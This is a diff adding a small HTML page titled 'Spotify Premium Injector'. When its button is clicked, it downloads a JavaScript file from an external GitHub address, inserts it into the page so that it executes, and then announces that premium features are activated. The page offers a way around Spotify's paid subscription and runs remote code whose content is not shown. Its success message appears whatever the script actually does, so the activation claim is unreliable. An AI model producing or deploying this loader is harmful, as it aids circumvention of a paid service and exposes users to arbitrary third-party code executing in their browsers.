@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spotify Premium Injector</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <button onclick="injectScript()">Activate Premium</button>
+    
+    <script>
+    function injectScript() {
+        fetch('https://raw.githubusercontent.com/ARAbdulla-Dev2/spoofSpoty/main/mobScript.js')
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(script => {
+                const el = document.createElement('script');
+                el.textContent = script;
+                document.body.appendChild(el);
+                alert('Spotify Premium features activated!');
+            })
+            .catch(error => {
+                console.error('Error loading script:', error);
+                alert('Failed to activate Premium. Please try again later.');
+            });
+    }
+    </script>
+</body>
+</html>
